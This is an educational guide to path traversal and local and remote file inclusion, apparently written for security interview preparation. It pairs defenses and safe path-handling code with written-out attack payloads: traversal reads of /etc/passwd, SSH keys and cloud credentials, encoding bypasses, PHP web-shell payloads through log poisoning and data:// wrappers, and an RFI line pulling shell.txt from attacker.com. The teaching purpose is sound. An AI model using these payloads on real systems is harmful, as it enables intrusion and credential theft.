# Path Traversal and File Inclusion (LFI / RFI)

> The application takes attacker-influenced input and uses it to build a filesystem path (or an include target) without first canonicalizing that path and confining it to an intended directory. Because `../` means "go up one level" to the operating system, an unconfined path escapes the base directory and names arbitrary files. The three severities are one spectrum: path traversal reads (or writes) a file, Local File Inclusion (LFI) additionally executes the included file's contents in the app runtime, and Remote File Inclusion (RFI) executes a file fetched from a URL the attacker controls. Root cause is always the same: trusting input to name a path, and failing to canonicalize then confine before the filesystem call. This is CWE-22.

## How it works

A vulnerable handler concatenates a base directory with a request value and hands the result to a filesystem API:

```
/* base */            /var/www/images/
/* user input */      218.png
/* read */            /var/www/images/218.png
```

Supplying traversal sequences walks the result out of the base before the read happens:

```
GET /loadImage?filename=../../../etc/passwd
=> reads /var/www/images/../../../etc/passwd
=> which the OS resolves to /etc/passwd
```

Why it works: `../` is a legal path component that the kernel collapses during path resolution, so three of them climb from `/var/www/images/` to the filesystem root. The application never intended to leave `images/`; it just trusted the filename. On Windows both `../` and `..\` are valid separators, so the equivalent is `..\..\..\windows\win.ini`. Note a platform difference: on Linux an attacker can traverse the whole disk, while on Windows they are confined to the partition holding the web root.

Three distinct sinks, escalating in impact:

- Read/write sink: the path feeds `open`/`read`/`sendfile`/`File(...)`/`readFile`/a download handler. Impact: disclose secrets and source, or (if the path feeds a write) overwrite files.
- Include/execute sink (LFI): the path feeds a language `include`/`require`/`import`, so the file's bytes are executed in the runtime. Predominantly PHP, but any dynamic-include mechanism qualifies. Reading is only the first step; the goal is code execution.
- Remote include sink (RFI): the include target may be a URL, so the server fetches and executes attacker-hosted code. Instant RCE where present.

One parsing subtlety that enables encoding bypasses: web containers perform one layer of percent-decoding on values from the URL and forms before the application sees them. If the application then decodes again, or if the container decodes a sequence the application's filter did not expect, encoded traversal slips through the gap between the check and the filesystem call.

## Attack techniques

### 1. Basic traversal (read arbitrary files)

```
https://target/loadImage?filename=../../../etc/passwd          (Linux)
https://target/loadImage?filename=..\..\..\windows\win.ini     (Windows)
```

Why it works: no confinement, so `../` escapes the base. Confirmation: the response contains the file (`root:x:0:0:...` for `/etc/passwd`). Test systematically against every parameter that could name a file.

### 2. Absolute path

```
?filename=/etc/passwd
?f=/var/www/html/get.php        (read the app's own source)
```

Why it works: if traversal sequences are blocked but the base directory is not actually enforced (the input is used as-is), an absolute path ignores the base entirely. Confirmation: file returned without any `../`.

### 3. Filter bypasses (the reasoning)

Filters that strip or block `../` fail because of decoding gaps and non-recursive replacement.

- URL-encoding and double URL-encoding (the container decodes one layer; a second layer survives to a re-decoding sink):

```
%2e%2e%2f        -> ../
%2e%2e/          -> ../
..%2f            -> ../
%252e%252e%252f  -> ../   (double-encoded)
..%255c          -> ..\   (double-encoded, Windows)
```

- Overlong / non-standard UTF-8 (legacy decoders map these to `.` and `/`):

```
..%c0%af         -> ../
..%c1%9c         -> ..\
..%ef%bc%8f      -> ../   (fullwidth solidus)
```

- Backslash on Windows: `..\`, `..%5c`, mixed `..%2f`.
- Non-recursive stripping: if the filter removes `../` exactly once, feed a sequence that reconstitutes it after one pass:

```
....//           -> (strip inner ../) -> ../
....\/           -> ..\
..././           -> ../
```

- Forced base-directory prefix: if the app requires the path to start with the allowed folder, include it and then climb out:

```
?filename=/var/www/images/../../../etc/passwd
```

- Forced extension suffix: if the app appends `.png`, historically a null byte truncated the string before the extension (`filename=../../../etc/passwd%00.png`). The OS saw `.passwd`, the language runtime saw `.png`. This was fixed in modern PHP (5.3.4+) and most runtimes; on current stacks pivot to a stream wrapper, path truncation, or target a file that already ends in the forced extension.
- Forced starts-with folder as a substring check: `expected/../../etc/passwd` satisfies a naive "must contain `expected/`" check while still traversing.

Why these work: each exploits a mismatch between the layer that validates (string filter, one decode) and the layer that resolves (kernel path resolution after full decode). The senior framing: never filter, canonicalize then confine.

### 4. LFI to RCE (the classic escalations)

Reading files is medium impact; interviewers want the path to code execution. These are PHP-centric because PHP `include`/`require` execute whatever they read.

Vulnerable pattern (from the OWASP write-up, via Wikipedia):

```php
<?php
$template = 'blue.php';
if (isset($_COOKIE['TEMPLATE'])) $template = $_COOKIE['TEMPLATE'];
include("/home/users/phpguru/templates/" . $template);
?>
```

- PHP stream wrappers:

```
php://filter/convert.base64-encode/resource=index.php   read+exfil source (base64), read-only but leaks secrets
php://input                                             include the raw POST body as PHP code (needs allow_url_include for some builds)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   inline payload
expect://id                                             run a command (needs the expect extension)
zip://uploaded.zip%23shell.php                          execute code from an uploaded archive
phar://uploaded.phar/shell.php                          execute from a Phar; phar:// also triggers deserialization (its own RCE path)
```

Why `php://filter` works: it is a read-only wrapper, so it bypasses "the file must be executable" logic and returns the source base64-encoded, letting you exfiltrate config/source (DB creds, `SECRET_KEY`) from a mere read primitive. Why `php://input`/`data://` work: they make the "file" you include be content you supply, so the included bytes are attacker PHP that executes.

- Log poisoning: write PHP into a log the server records, then LFI-include that log so your code executes.

```
User-Agent: <?php system($_GET['c']); ?>
=> then include /var/log/apache2/access.log (or nginx, SSH auth.log, mail log)
```

- Session poisoning: get PHP stored into your own session file via a controllable session value, then include it.

```
=> include /var/lib/php/sessions/sess_<PHPSESSID>  or  /tmp/sess_<id>
```

- /proc tricks: include `/proc/self/environ` after poisoning an environment value (for example User-Agent, on older setups that expose it), or `/proc/self/fd/*`.
- Upload plus include: upload a benign-looking file (an "image" that contains PHP), then LFI-include it. This defeats upload filters that only check the extension/content type, because the include, not the upload, is the execution sink.

Confirmation for all: your command output (or a time delay / OOB callback) appears, proving execution rather than mere read.

### 5. RFI (remote file inclusion)

```
http://target/some-page?page=http://attacker.com/shell.txt
```

Why it works: with PHP `allow_url_include=On`, `include($_GET['page'])` fetches and executes remote code, so you host the payload and get direct RCE. Rare on modern PHP (`allow_url_include` is Off by default), but an instant win where present. The same setting gates remote stream wrappers.

### 6. High-value read targets (quick recall)

`/etc/passwd`, `/etc/shadow` (if readable), app config and `.env` (DB creds, API keys), application source, `~/.ssh/id_rsa`, `~/.aws/credentials`, `/proc/self/cmdline` and `/proc/self/environ`, web server config (`httpd.conf`, nginx `sites-enabled`), framework secrets (`settings.py`, `web.config`, `application.properties`), and on Windows `win.ini`, `\windows\system32\drivers\etc\hosts`, `unattend.xml`, SAM/registry hives.

### 7. Detection and blind confirmation

Find file operations whose path derives from request data: `open`/`read`/`include`/`require`/`fopen`/`sendfile`/`File(...)`/`readFile`/template loaders/zip extractors. Probe with encoded traversal, absolute paths, and wrapper schemes. Determine whether the target is a read sink (output returned) or an include sink (content executed) by including something that would error if executed vs merely printed. Blind cases: use timing (include a large/blocking pseudo-file) or verbose error messages, which OWASP notes make it much easier to guess correct paths by leaking the base directory in stack traces.

## Defense

Ordered by effectiveness. The reliable fix removes user control of the path or confines it after canonicalization; string filtering is the weakest layer.

1. Do not pass user input to filesystem APIs at all. Reference files by an indirect identifier: map an opaque ID or an enum value to a known server-side path (`id=5 => "reports/czech.pdf"`), never accept a filename or path from the request. This eliminates the class of bug. OWASP's phrasing: use indexes rather than actual portions of file names.
2. Canonicalize, then confine. Resolve the path to its absolute real form, then verify it still lives under the intended base directory after resolution (this defeats `../` and symlink escapes). Normalize first, check second.

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // safe to process
}
```

```python
import os
base = os.path.realpath(BASE_DIR)
target = os.path.realpath(os.path.join(base, user_input))
if target == base or target.startswith(base + os.sep):
    ...   # confined
```

3. Strict allowlist for the varying part: permit only known filenames, or validate against `^[A-Za-z0-9_-]+$` and reject path separators, dots, and any encoded forms. OWASP: accept known-good, do not try to sanitize (blacklisting/stripping is bypassable).
4. Disable dangerous inclusion features: PHP `allow_url_include=Off` and `allow_url_fopen=Off` (kills RFI and remote wrappers), and avoid dynamic `include` on user input entirely. Ensure you understand how the OS will interpret the filename you hand it.
5. Least privilege and isolation: run the app as a low-privilege user, use a chroot jail / container / mount namespace so even a successful traversal reaches little, and keep secrets and configuration outside the web root. On Windows IIS, keep the web root off the system disk to prevent recursive traversal into system directories.
6. Harden logging and session paths so poisoning-to-LFI is infeasible: separate the include surface from writable, attacker-influenced files.

## Interview-grade nuances

- "We strip `../`" is the classic wrong answer. Non-recursive stripping (`....//`), single vs double URL-encoding, overlong UTF-8 (`%c0%af`), and absolute paths all defeat it. Filtering treats a resolution problem as a string problem.
- Canonicalize-then-confine is the correct fix, and the order matters: normalize to the real absolute path first, then check the prefix. Checking the raw input before normalization is defeated by encoding and by `../`.
- The `getCanonicalPath().startsWith(BASE)` pattern has a real pitfall: if `BASE` lacks a trailing separator, a sibling directory sharing the prefix (for example base `/var/www/images` and target `/var/www/images_public/../../etc/passwd` resolving to a path that still starts with the string `/var/www/images`) can pass the check. Append the separator (`BASE + File.separator`) or compare canonical parents. Symlinks are why you must resolve to the real path, not just lexically normalize.
- The web container decodes one percent layer before the app sees input, which is exactly why double-encoding (`%252e`) and non-standard encodings bypass filters that run on the already-once-decoded string. Naming this decode boundary signals depth.
- Null-byte truncation (`%00`) is a legacy technique: it worked because C strings terminate at NUL while the language kept the full string, but it was fixed in PHP 5.3.4 and does not work on modern runtimes. Citing it as still-universal is a junior tell; cite it as historical and pivot to wrappers/truncation.
- Traversal is not "just file read." LFI escalates to RCE through logs, session files, `/proc`, wrappers (`php://input`, `data://`, `expect://`, `phar://`), and upload-plus-include. Staff-level answers state the escalation path, not just `/etc/passwd`.
- `php://filter` is a read-only wrapper yet high impact: it exfiltrates source and secrets from a pure read primitive, so "it can only read files" understates the risk.
- RFI is largely historical on PHP because `allow_url_include` defaults to Off, but the same knob gates remote stream wrappers, and non-PHP dynamic-include mechanisms can still fetch remote code. Do not assume RFI is dead; verify the config.
- Platform confinement differs: Linux traversal reaches the whole disk; Windows confines you to the web root's partition, and Windows tolerates trailing `. \ /` characters that can bypass some suffix checks.
- Indirect object reference (map IDs to paths) is strictly better than any validation, because it removes user control of the path rather than trying to sanitize it, the same philosophy as parameterized queries for SQL injection.

## Sources

- PortSwigger Web Security Academy, Path traversal: https://portswigger.net/web-security/file-path-traversal
- OWASP Community, Path Traversal (encoding variations, null byte, absolute path, RFI, prevention): https://owasp.org/www-community/attacks/Path_Traversal
- MITRE CWE-22, Improper Limitation of a Pathname to a Restricted Directory: https://cwe.mitre.org/data/definitions/22.html
- OWASP WSTG, Testing for Directory Traversal / File Include: https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md
